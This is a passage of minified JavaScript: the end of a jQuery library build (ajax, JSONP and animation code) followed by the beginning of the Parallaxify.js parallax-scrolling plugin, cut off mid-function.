v||(e=y[n]=y[n]||e,m[e]=t),this},overrideMimeType:function(e){return v||(c.mimeType=e),this},statusCode:function(e){var t;if(e)if(2>v)for(t in e)g[t]=[g[t],e[t]];else T.always(e[T.status]);return this},abort:function(e){var t=e||b;return n&&n.abort(t),k(0,t),this}};if(h.promise(T).complete=d.add,T.success=T.done,T.error=T.fail,c.url=((e||c.url||Ut)+"").replace(Gt,"").replace(en,Xt[1]+"//"),c.type=t.method||t.type||c.method||c.type,c.dataTypes=x.trim(c.dataType||"*").toLowerCase().match(w)||[""],null==c.crossDomain&&(a=tn.exec(c.url.toLowerCase()),c.crossDomain=!(!a||a[1]===Xt[1]&&a[2]===Xt[2]&&(a[3]||("http:"===a[1]?"80":"443"))===(Xt[3]||("http:"===Xt[1]?"80":"443")))),c.data&&c.processData&&"string"!=typeof c.data&&(c.data=x.param(c.data,c.traditional)),ln(rn,c,t,T),2===v)return T;u=c.global,u&&0===x.active++&&x.event.trigger("ajaxStart"),c.type=c.type.toUpperCase(),c.hasContent=!Zt.test(c.type),r=c.url,c.hasContent||(c.data&&(r=c.url+=(Vt.test(r)?"&":"?")+c.data,delete c.data),c.cache===!1&&(c.url=Jt.test(r)?r.replace(Jt,"$1_="+Yt++):r+(Vt.test(r)?"&":"?")+"_="+Yt++)),c.ifModified&&(x.lastModified[r]&&T.setRequestHeader("If-Modified-Since",x.lastModified[r]),x.etag[r]&&T.setRequestHeader("If-None-Match",x.etag[r])),(c.data&&c.hasContent&&c.contentType!==!1||t.contentType)&&T.setRequestHeader("Content-Type",c.contentType),T.setRequestHeader("Accept",c.dataTypes[0]&&c.accepts[c.dataTypes[0]]?c.accepts[c.dataTypes[0]]+("*"!==c.dataTypes[0]?", "+sn+"; q=0.01":""):c.accepts["*"]);for(l in c.headers)T.setRequestHeader(l,c.headers[l]);if(c.beforeSend&&(c.beforeSend.call(p,T,c)===!1||2===v))return T.abort();b="abort";for(l in{success:1,error:1,complete:1})T[l](c[l]);if(n=ln(on,c,t,T)){T.readyState=1,u&&f.trigger("ajaxSend",[T,c]),c.async&&c.timeout>0&&(s=setTimeout(function(){T.abort("timeout")},c.timeout));try{v=1,n.send(m,k)}catch(C){if(!(2>v))throw C;k(-1,C)}}else k(-1,"No Transport");function k(e,t,o,a){var l,m,y,b,w,C=t;2!==v&&(v=2,s&&clearTimeout(s),n=undefined,i=a||"",T.readyState=e>0?4:0,l=e>=200&&300>e||304===e,o&&(b=pn(c,T,o)),b=fn(c,b,T,l),l?(c.ifModified&&(w=T.getResponseHeader("Last-Modified"),w&&(x.lastModified[r]=w),w=T.getResponseHeader("etag"),w&&(x.etag[r]=w)),204===e||"HEAD"===c.type?C="nocontent":304===e?C="notmodified":(C=b.state,m=b.data,y=b.error,l=!y)):(y=C,(e||!C)&&(C="error",0>e&&(e=0))),T.status=e,T.statusText=(t||C)+"",l?h.resolveWith(p,[m,C,T]):h.rejectWith(p,[T,C,y]),T.statusCode(g),g=undefined,u&&f.trigger(l?"ajaxSuccess":"ajaxError",[T,c,l?m:y]),d.fireWith(p,[T,C]),u&&(f.trigger("ajaxComplete",[T,c]),--x.active||x.event.trigger("ajaxStop")))}return T},getJSON:function(e,t,n){return x.get(e,t,n,"json")},getScript:function(e,t){return x.get(e,undefined,t,"script")}}),x.each(["get","post"],function(e,t){x[t]=function(e,n,r,i){return x.isFunction(n)&&(i=i||r,r=n,n=undefined),x.ajax({url:e,type:t,dataType:i,data:n,success:r})}});function pn(e,t,n){var r,i,o,s,a=e.contents,u=e.dataTypes;while("*"===u[0])u.shift(),r===undefined&&(r=e.mimeType||t.getResponseHeader("Content-Type"));if(r)for(i in a)if(a[i]&&a[i].test(r)){u.unshift(i);break}if(u[0]in n)o=u[0];else{for(i in n){if(!u[0]||e.converters[i+" "+u[0]]){o=i;break}s||(s=i)}o=o||s}return o?(o!==u[0]&&u.unshift(o),n[o]):undefined}function fn(e,t,n,r){var i,o,s,a,u,l={},c=e.dataTypes.slice();if(c[1])for(s in e.converters)l[s.toLowerCase()]=e.converters[s];o=c.shift();while(o)if(e.responseFields[o]&&(n[e.responseFields[o]]=t),!u&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),u=o,o=c.shift())if("*"===o)o=u;else if("*"!==u&&u!==o){if(s=l[u+" "+o]||l["* "+o],!s)for(i in l)if(a=i.split(" "),a[1]===o&&(s=l[u+" "+a[0]]||l["* "+a[0]])){s===!0?s=l[i]:l[i]!==!0&&(o=a[0],c.unshift(a[1]));break}if(s!==!0)if(s&&e["throws"])t=s(t);else try{t=s(t)}catch(p){return{state:"parsererror",error:s?p:"No conversion from "+u+" to "+o}}}return{state:"success",data:t}}x.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/(?:java|ecma)script/},converters:{"text script":function(e){return x.globalEval(e),e}}}),x.ajaxPrefilter("script",function(e){e.cache===undefined&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),x.ajaxTransport("script",function(e){if(e.crossDomain){var t,n;return{send:function(r,i){t=x("<script>").prop({async:!0,charset:e.scriptCharset,src:e.url}).on("load error",n=function(e){t.remove(),n=null,e&&i("error"===e.type?404:200,e.type)}),o.head.appendChild(t[0])},abort:function(){n&&n()}}}});var hn=[],dn=/(=)\?(?=&|$)|\?\?/;x.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=hn.pop()||x.expando+"_"+Yt++;return this[e]=!0,e}}),x.ajaxPrefilter("json jsonp",function(t,n,r){var i,o,s,a=t.jsonp!==!1&&(dn.test(t.url)?"url":"string"==typeof t.data&&!(t.contentType||"").indexOf("application/x-www-form-urlencoded")&&dn.test(t.data)&&"data");return a||"jsonp"===t.dataTypes[0]?(i=t.jsonpCallback=x.isFunction(t.jsonpCallback)?t.jsonpCallback():t.jsonpCallback,a?t[a]=t[a].replace(dn,"$1"+i):t.jsonp!==!1&&(t.url+=(Vt.test(t.url)?"&":"?")+t.jsonp+"="+i),t.converters["script json"]=function(){return s||x.error(i+" was not called"),s[0]},t.dataTypes[0]="json",o=e[i],e[i]=function(){s=arguments},r.always(function(){e[i]=o,t[i]&&(t.jsonpCallback=n.jsonpCallback,hn.push(i)),s&&x.isFunction(o)&&o(s[0]),s=o=undefined}),"script"):undefined}),x.ajaxSettings.xhr=function(){try{return new XMLHttpRequest}catch(e){}};var gn=x.ajaxSettings.xhr(),mn={0:200,1223:204},yn=0,vn={};e.ActiveXObject&&x(e).on("unload",function(){for(var e in vn)vn[e]();vn=undefined}),x.support.cors=!!gn&&"withCredentials"in gn,x.support.ajax=gn=!!gn,x.ajaxTransport(function(e){var t;return x.support.cors||gn&&!e.crossDomain?{send:function(n,r){var i,o,s=e.xhr();if(s.open(e.type,e.url,e.async,e.username,e.password),e.xhrFields)for(i in e.xhrFields)s[i]=e.xhrFields[i];e.mimeType&&s.overrideMimeType&&s.overrideMimeType(e.mimeType),e.crossDomain||n["X-Requested-With"]||(n["X-Requested-With"]="XMLHttpRequest");for(i in n)s.setRequestHeader(i,n[i]);t=function(e){return function(){t&&(delete vn[o],t=s.onload=s.onerror=null,"abort"===e?s.abort():"error"===e?r(s.status||404,s.statusText):r(mn[s.status]||s.status,s.statusText,"string"==typeof s.responseText?{text:s.responseText}:undefined,s.getAllResponseHeaders()))}},s.onload=t(),s.onerror=t("error"),t=vn[o=yn++]=t("abort"),s.send(e.hasContent&&e.data||null)},abort:function(){t&&t()}}:undefined});var xn,bn,wn=/^(?:toggle|show|hide)$/,Tn=RegExp("^(?:([+-])=|)("+b+")([a-z%]*)$","i"),Cn=/queueHooks$/,kn=[An],Nn={"*":[function(e,t){var n=this.createTween(e,t),r=n.cur(),i=Tn.exec(t),o=i&&i[3]||(x.cssNumber[e]?"":"px"),s=(x.cssNumber[e]||"px"!==o&&+r)&&Tn.exec(x.css(n.elem,e)),a=1,u=20;if(s&&s[3]!==o){o=o||s[3],i=i||[],s=+r||1;do a=a||".5",s/=a,x.style(n.elem,e,s+o);while(a!==(a=n.cur()/r)&&1!==a&&--u)}return i&&(s=n.start=+s||+r||0,n.unit=o,n.end=i[1]?s+(i[1]+1)*i[2]:+i[2]),n}]};function En(){return setTimeout(function(){xn=undefined}),xn=x.now()}function Sn(e,t,n){var r,i=(Nn[t]||[]).concat(Nn["*"]),o=0,s=i.length;for(;s>o;o++)if(r=i[o].call(n,t,e))return r}function jn(e,t,n){var r,i,o=0,s=kn.length,a=x.Deferred().always(function(){delete u.elem}),u=function(){if(i)return!1;var t=xn||En(),n=Math.max(0,l.startTime+l.duration-t),r=n/l.duration||0,o=1-r,s=0,u=l.tweens.length;for(;u>s;s++)l.tweens[s].run(o);return a.notifyWith(e,[l,o,n]),1>o&&u?n:(a.resolveWith(e,[l]),!1)},l=a.promise({elem:e,props:x.extend({},t),opts:x.extend(!0,{specialEasing:{}},n),originalProperties:t,originalOptions:n,startTime:xn||En(),duration:n.duration,tweens:[],createTween:function(t,n){var r=x.Tween(e,l.opts,t,n,l.opts.specialEasing[t]||l.opts.easing);return l.tweens.push(r),r},stop:function(t){var n=0,r=t?l.tweens.length:0;if(i)return this;for(i=!0;r>n;n++)l.tweens[n].run(1);return t?a.resolveWith(e,[l,t]):a.rejectWith(e,[l,t]),this}}),c=l.props;for(Dn(c,l.opts.specialEasing);s>o;o++)if(r=kn[o].call(l,e,c,l.opts))return r;return x.map(c,Sn,l),x.isFunction(l.opts.start)&&l.opts.start.call(e,l),x.fx.timer(x.extend(u,{elem:e,anim:l,queue:l.opts.queue})),l.progress(l.opts.progress).done(l.opts.done,l.opts.complete).fail(l.opts.fail).always(l.opts.always)}function Dn(e,t){var n,r,i,o,s;for(n in e)if(r=x.camelCase(n),i=t[r],o=e[n],x.isArray(o)&&(i=o[1],o=e[n]=o[0]),n!==r&&(e[r]=o,delete e[n]),s=x.cssHooks[r],s&&"expand"in s){o=s.expand(o),delete e[r];for(n in o)n in e||(e[n]=o[n],t[n]=i)}else t[r]=i}x.Animation=x.extend(jn,{tweener:function(e,t){x.isFunction(e)?(t=e,e=["*"]):e=e.split(" ");var n,r=0,i=e.length;for(;i>r;r++)n=e[r],Nn[n]=Nn[n]||[],Nn[n].unshift(t)},prefilter:function(e,t){t?kn.unshift(e):kn.push(e)}});function An(e,t,n){var r,i,o,s,a,u,l=this,c={},p=e.style,f=e.nodeType&&Lt(e),h=q.get(e,"fxshow");n.queue||(a=x._queueHooks(e,"fx"),null==a.unqueued&&(a.unqueued=0,u=a.empty.fire,a.empty.fire=function(){a.unqueued||u()}),a.unqueued++,l.always(function(){l.always(function(){a.unqueued--,x.queue(e,"fx").length||a.empty.fire()})})),1===e.nodeType&&("height"in t||"width"in t)&&(n.overflow=[p.overflow,p.overflowX,p.overflowY],"inline"===x.css(e,"display")&&"none"===x.css(e,"float")&&(p.display="inline-block")),n.overflow&&(p.overflow="hidden",l.always(function(){p.overflow=n.overflow[0],p.overflowX=n.overflow[1],p.overflowY=n.overflow[2]}));for(r in t)if(i=t[r],wn.exec(i)){if(delete t[r],o=o||"toggle"===i,i===(f?"hide":"show")){if("show"!==i||!h||h[r]===undefined)continue;f=!0}c[r]=h&&h[r]||x.style(e,r)}if(!x.isEmptyObject(c)){h?"hidden"in h&&(f=h.hidden):h=q.access(e,"fxshow",{}),o&&(h.hidden=!f),f?x(e).show():l.done(function(){x(e).hide()}),l.done(function(){var t;q.remove(e,"fxshow");for(t in c)x.style(e,t,c[t])});for(r in c)s=Sn(f?h[r]:0,r,l),r in h||(h[r]=s.start,f&&(s.end=s.start,s.start="width"===r||"height"===r?1:0))}}function Ln(e,t,n,r,i){return new Ln.prototype.init(e,t,n,r,i)}x.Tween=Ln,Ln.prototype={constructor:Ln,init:function(e,t,n,r,i,o){this.elem=e,this.prop=n,this.easing=i||"swing",this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=o||(x.cssNumber[n]?"":"px")},cur:function(){var e=Ln.propHooks[this.prop];return e&&e.get?e.get(this):Ln.propHooks._default.get(this)},run:function(e){var t,n=Ln.propHooks[this.prop];return this.pos=t=this.options.duration?x.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):Ln.propHooks._default.set(this),this}},Ln.prototype.init.prototype=Ln.prototype,Ln.propHooks={_default:{get:function(e){var t;return null==e.elem[e.prop]||e.elem.style&&null!=e.elem.style[e.prop]?(t=x.css(e.elem,e.prop,""),t&&"auto"!==t?t:0):e.elem[e.prop]},set:function(e){x.fx.step[e.prop]?x.fx.step[e.prop](e):e.elem.style&&(null!=e.elem.style[x.cssProps[e.prop]]||x.cssHooks[e.prop])?x.style(e.elem,e.prop,e.now+e.unit):e.elem[e.prop]=e.now}}},Ln.propHooks.scrollTop=Ln.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},x.each(["toggle","show","hide"],function(e,t){var n=x.fn[t];x.fn[t]=function(e,r,i){return null==e||"boolean"==typeof e?n.apply(this,arguments):this.animate(qn(t,!0),e,r,i)}}),x.fn.extend({fadeTo:function(e,t,n,r){return this.filter(Lt).css("opacity",0).show().end().animate({opacity:t},e,n,r)},animate:function(e,t,n,r){var i=x.isEmptyObject(e),o=x.speed(t,n,r),s=function(){var t=jn(this,x.extend({},e),o);(i||q.get(this,"finish"))&&t.stop(!0)};return s.finish=s,i||o.queue===!1?this.each(s):this.queue(o.queue,s)},stop:function(e,t,n){var r=function(e){var t=e.stop;delete e.stop,t(n)};return"string"!=typeof e&&(n=t,t=e,e=undefined),t&&e!==!1&&this.queue(e||"fx",[]),this.each(function(){var t=!0,i=null!=e&&e+"queueHooks",o=x.timers,s=q.get(this);if(i)s[i]&&s[i].stop&&r(s[i]);else for(i in s)s[i]&&s[i].stop&&Cn.test(i)&&r(s[i]);for(i=o.length;i--;)o[i].elem!==this||null!=e&&o[i].queue!==e||(o[i].anim.stop(n),t=!1,o.splice(i,1));(t||!n)&&x.dequeue(this,e)})},finish:function(e){return e!==!1&&(e=e||"fx"),this.each(function(){var t,n=q.get(this),r=n[e+"queue"],i=n[e+"queueHooks"],o=x.timers,s=r?r.length:0;for(n.finish=!0,x.queue(this,e,[]),i&&i.stop&&i.stop.call(this,!0),t=o.length;t--;)o[t].elem===this&&o[t].queue===e&&(o[t].anim.stop(!0),o.splice(t,1));for(t=0;s>t;t++)r[t]&&r[t].finish&&r[t].finish.call(this);delete n.finish})}});function qn(e,t){var n,r={height:e},i=0;for(t=t?1:0;4>i;i+=2-t)n=jt[i],r["margin"+n]=r["padding"+n]=e;return t&&(r.opacity=r.width=e),r}x.each({slideDown:qn("show"),slideUp:qn("hide"),slideToggle:qn("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,t){x.fn[e]=function(e,n,r){return this.animate(t,e,n,r)}}),x.speed=function(e,t,n){var r=e&&"object"==typeof e?x.extend({},e):{complete:n||!n&&t||x.isFunction(e)&&e,duration:e,easing:n&&t||t&&!x.isFunction(t)&&t};return r.duration=x.fx.off?0:"number"==typeof r.duration?r.duration:r.duration in x.fx.speeds?x.fx.speeds[r.duration]:x.fx.speeds._default,(null==r.queue||r.queue===!0)&&(r.queue="fx"),r.old=r.complete,r.complete=function(){x.isFunction(r.old)&&r.old.call(this),r.queue&&x.dequeue(this,r.queue)},r},x.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2}},x.timers=[],x.fx=Ln.prototype.init,x.fx.tick=function(){var e,t=x.timers,n=0;for(xn=x.now();t.length>n;n++)e=t[n],e()||t[n]!==e||t.splice(n--,1);t.length||x.fx.stop(),xn=undefined},x.fx.timer=function(e){e()&&x.timers.push(e)&&x.fx.start()},x.fx.interval=13,x.fx.start=function(){bn||(bn=setInterval(x.fx.tick,x.fx.interval))},x.fx.stop=function(){clearInterval(bn),bn=null},x.fx.speeds={slow:600,fast:200,_default:400},x.fx.step={},x.expr&&x.expr.filters&&(x.expr.filters.animated=function(e){return x.grep(x.timers,function(t){return e===t.elem}).length}),x.fn.offset=function(e){if(arguments.length)return e===undefined?this:this.each(function(t){x.offset.setOffset(this,e,t)});var t,n,i=this[0],o={top:0,left:0},s=i&&i.ownerDocument;if(s)return t=s.documentElement,x.contains(t,i)?(typeof i.getBoundingClientRect!==r&&(o=i.getBoundingClientRect()),n=Hn(s),{top:o.top+n.pageYOffset-t.clientTop,left:o.left+n.pageXOffset-t.clientLeft}):o},x.offset={setOffset:function(e,t,n){var r,i,o,s,a,u,l,c=x.css(e,"position"),p=x(e),f={};"static"===c&&(e.style.position="relative"),a=p.offset(),o=x.css(e,"top"),u=x.css(e,"left"),l=("absolute"===c||"fixed"===c)&&(o+u).indexOf("auto")>-1,l?(r=p.position(),s=r.top,i=r.left):(s=parseFloat(o)||0,i=parseFloat(u)||0),x.isFunction(t)&&(t=t.call(e,n,a)),null!=t.top&&(f.top=t.top-a.top+s),null!=t.left&&(f.left=t.left-a.left+i),"using"in t?t.using.call(e,f):p.css(f)}},x.fn.extend({position:function(){if(this[0]){var e,t,n=this[0],r={top:0,left:0};return"fixed"===x.css(n,"position")?t=n.getBoundingClientRect():(e=this.offsetParent(),t=this.offset(),x.nodeName(e[0],"html")||(r=e.offset()),r.top+=x.css(e[0],"borderTopWidth",!0),r.left+=x.css(e[0],"borderLeftWidth",!0)),{top:t.top-r.top-x.css(n,"marginTop",!0),left:t.left-r.left-x.css(n,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var e=this.offsetParent||s;while(e&&!x.nodeName(e,"html")&&"static"===x.css(e,"position"))e=e.offsetParent;return e||s})}}),x.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(t,n){var r="pageYOffset"===n;x.fn[t]=function(i){return x.access(this,function(t,i,o){var s=Hn(t);return o===undefined?s?s[n]:t[i]:(s?s.scrollTo(r?e.pageXOffset:o,r?o:e.pageYOffset):t[i]=o,undefined)},t,i,arguments.length,null)}});function Hn(e){return x.isWindow(e)?e:9===e.nodeType&&e.defaultView}x.each({Height:"height",Width:"width"},function(e,t){x.each({padding:"inner"+e,content:t,"":"outer"+e},function(n,r){x.fn[r]=function(r,i){var o=arguments.length&&(n||"boolean"!=typeof r),s=n||(r===!0||i===!0?"margin":"border");return x.access(this,function(t,n,r){var i;return x.isWindow(t)?t.document.documentElement["client"+e]:9===t.nodeType?(i=t.documentElement,Math.max(t.body["scroll"+e],i["scroll"+e],t.body["offset"+e],i["offset"+e],i["client"+e])):r===undefined?x.css(t,n,s):x.style(t,n,r,s)},t,o?r:undefined,o,null)}})}),x.fn.size=function(){return this.length},x.fn.andSelf=x.fn.addBack,"object"==typeof module&&module&&"object"==typeof module.exports?module.exports=x:"function"==typeof define&&define.amd&&define("jquery",[],function(){return x}),"object"==typeof e&&"object"==typeof e.document&&(e.jQuery=e.$=x)})(window);

/*!
 * Parallaxify.js v0.0.2
 * http://hwthorn.github.io/parallaxify
 *
 * Copyright 2013, Felix Pflaum
 * Released under the MIT license
 * http://hwthorn.mit-license.org
 */
(function(f,g,v,d){function m(a,c){this.element=a;this.options=f.extend({},t,c);this._defaults=t;this._name=h;this.init()}var h="parallaxify",t={positionProperty:"position",horizontalParallax:!0,verticalParallax:!0,parallaxBackgrounds:!0,parallaxElements:!0,responsive:!1,useMouseMove:!0,useGyroscope:!0,alphaFilter:0.9,motionType:"natural",mouseMotionType:"gaussian",inputPriority:"mouse",motionAngleX:80,motionAngleY:80,adjustBasePosition:!0,alphaPosition:0.05},u={position:{setLeft:function(a,c){a.css("left",
c)},setTop:function(a,c){a.css("top",c)}},transform:{setPosition:function(a,c,b,e,d){a[0].style[w]="translate3d("+(c-b)+"px, "+(e-d)+"px, 0)"}}},j=function(a,c,b){if(null===c)return a;"undefined"===typeof b&&(b=0.5);return b*a+(1-b)*c},k=[],p={linear:function(a,c){return a<=-c?1:a>=c?-1:-a/c},natural:function(a,c){if(a<=-c)return 1;if(a>=c)return-1;k["n"+c]===d&&(k["n"+c]=Math.tan(0.01745*c));return-Math.tan(0.01745*a)/k["n"+c]},performance:function(a,c){if(a<=-c)return 1;if(a>=c)return-1;k["p"+c]===
d&&(k["p"+c]=c/90+4.2*Math.pow(c/90,7));return-(a/90+4.2*Math.pow(a/90,7))/k["p"+c]},gaussian:function(a,c){return 1-2*(1/(1+Math.exp(-(0.07056*(135/c)*(a/90^3))-1.5976*(135/c)*(a/90))))}},n=/^(Moz|Webkit|Khtml|O|ms|Icab)(?=[A-Z])/,q=f("script")[0].style,l="",r;for(r in q)if(n.test(r)){l=r.match(n)[0];break}"WebkitOpacity"in q&&(l="Webkit");"KhtmlOpacity"in q&&(l="Khtml");var w=l+(0<l.length?"T"+"transform".slice(1):"transform"),s=(n=f("<div />",{style:"background:#fff"}).css("background-position-x")!==
d)?function(a,c,b){a.css({"background-position-x":c,"background-position-y":b})}:function(a,c,b){a.css("background-position",c+" "+b)},x=n?function(a){return[a.css("background-position-x"),a.css("background-position-y")]}:function(a){return a.css("background-position").split(" ")},y=g.requestAnimationFrame||g.webkitRequestAnimationFrame||g.mozRequestAnimationFrame||g.oRequestAnimationFrame||g.msRequestAnimationFrame||function(a){setTimeout(a,1E3/30)};m.prototype={init:function(){this.options.name=
h+"_"+Math.floor(1E9*Math.random());this.tilt={beta:0,gamma:0};this._defineElements();this._defineGetters();this._defineSetters();this._detectMobile();this._detectMotionType();this._detectViewport();this._handleWindowLoadAndResize();this.refresh({firstLoad:!0});this._startAnimation()},_defineElements:function(){this.$element=this.element===v.body||this.element===g?f("body"):f(this.element);this.$viewportElement=f(g)},_defineGetters:function(){var a=p[this.options.motionType],c=p[this.options.mouseMotionType];
this._getMoveHorizontal=function(){if(this.useMouseMove&&null!==this.clientX&&this.clientX!==this.oldClientX)return c(this.options.motionAngleX*(1-2*this.clientX/this.viewportWidth),this.options.motionAngleX);if(this.useSensor&&null!==this.beta&&null!==this.gamma){var b=this.tilt;return this.viewportLandscape?this.viewportFlipped?a(-b.beta,this.options.motionAngleX):a(b.beta,this.options.motionAngleX):this.viewportFlipped?a(-b.gamma,this.options.motionAngleX):a(b.gamma,this.options.motionAngleX)}this.useSensor=
!1;return c(this.options.motionAngleX*(1-2*this.oldClientX/this.viewportWidth),this.options.motionAngleX)};this._getMoveVertical=function(){if(this.options.useMouseMove&&null!==this.clientY&&this.clientY!==this.oldClientY)return c(this.options.motionAngleY*(1-2*this.clientY/this.viewportHeight),this.options.motionAngleY);if(this.useSensor&&null!==this.beta&&null!==this.gamma){var b=this.tilt;return this.viewportLandscape?this.viewportFlipped?a(-b.gamma,this.options.motionAngleY):a(b.gamma,this.options.motionAngleY):
this.viewportFlipped?a(-b.beta,this.options.motionAngleY):a(b.beta,this.options.motionAngleY)}this.useSensor=!1;return c(this.options.motionAngleY*(1-2*this.oldClientY/this.viewportHeight),this.options.motionAngleY)}},_defineSetters:function(){var a=this,c=u[a.options.positionProperty];this._setPosition=c.setPosition||function(b,e,d,f,g){a.options.horizontalParallax&&c.setLeft(b,e,d);a.options.verticalParallax&&c.setTop(b,f,g)}},refresh:function(a){(!a||!a.firstLoad)&&this._reset();this._findElements();
this._findBackgrounds();a&&(a.firstLoad&&/WebKit/.test(navigator.userAgent))&&f(g).load(function(){var a=f("body");oldLeft=a.scrollLeft();oldTop=a.scrollTop();a.scrollLeft(oldLeft+1);a.scrollTop(oldTop+1);a.scrollLeft(oldLeft);a.scrollTop(oldTop)})},_detectViewport:function(){this.viewportWidth=this.$viewportElement.width();this.viewportHeight=this.$viewportElement.height();this.useSensor&&(this.viewportFlipped=180===g.orientation,this.viewportLandscape=90===Math.abs(g.orientation))},_detectMobile:function(){var a=
navigator.userAgent||navigator.vendor||g.opera;this.isMobile=/(bb\d+|meego).+mobile|android|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od|ad)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|playbook|plucker|pocket|psp|series(4|6)0|silk|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,
4))},_detectMotionType:function(){this.useMouseMove=this.useSensorMoz=this.useSensorWebkit=this.useSensor=!1;if(this.options.useGyroscope&&(this.isMobile||"gyroscope"===this.options.inputPriority))this.useSensorWebkit=g.DeviceOrientationEvent!==d,this.useSensorMoz=g.OrientationEvent!==d,this.useSensor=this.useSensorWebkit||this.useSensorMoz;this.options.useMouseMove&&!this.isMobile&&(this.useMouseMove=this.$viewportElement.mousemove!==d)},_findElements:function(){var a=this;if(this.elements!==d)for(var c=
this.elements.length-1;0<=c;c--)this.elements[c].$element.data("parallaxify-ElementIsActive",d);this.elements=[];this.options.parallaxElements&&this.$element.find("[data-parallaxify-range],[data-parallaxify-range-x],[data-parallaxify-range-y]").each(function(){var b=f(this);if(b.data("parallaxify-ElementIsActive")){if(b.data("parallaxify-ElementIsActive")!==this)return}else b.data("parallaxify-ElementIsActive",this);b.data("parralaxify-originalLeft")?(b.css("left",b.data("parallaxify-originalLeft")),
b.css("top",b.data("parallaxify-originalTop"))):(b.data("parallaxify-originalLeft",b.css("left")),b.data("parallaxify-originalTop",b.css("top")));a.elements.push({$element:b,originalPositionLeft:b.position().left,originalPositionTop:b.position().top,parallaxDistanceX:b.data("parallaxify-range-x")!==d?b.data("parallaxify-range-x"):b.data("parallaxify-range")!==d?b.data("parallaxify-range"):0,parallaxDistanceY:b.data("parallaxify-range-y")!==d?b.data("parallaxify-range-y"):b.data("parallaxify-range")!==
d?b.data("parallaxify-range"):0,width:b.outerWidth(!0),height:b.outerHeight(!0)})})},_findBackgrounds:function(){var a=this,c;this.backgrounds=[];if(this.options.parallaxBackgrounds){c=this.$element.find("[data-parallaxify-background-range],[data-parallaxify-background-range-x],[data-parallaxify-background-range-y]");if(this.$element.data("parallaxify-background-range")||this.$element.data("parallaxify-background-range-x")||this.$element.data("parallaxify-background-range-y"))c=c.add(this.$element);
c.each(function(){var b=f(this),c=x(b);if(b.data("parallaxify-backgroundIsActive")){if(b.data("parallaxify-backgroundIsActive")!==this)return}else b.data("parallaxify-backgroundIsActive",this);b.data("parralaxify-backgroundOriginalLeft")?s(b,b.data("parallaxify-backgroundOriginalLeft"),b.data("parallaxify-backgroundOriginalTop")):(b.data("parallaxify-backgroundOriginalLeft",c[0]),b.data("parallaxify-backgroundOriginalTop",c[1]));a.backgrounds.push({$element:b,originalValueLeft:c[0],originalValueTop:c[1],
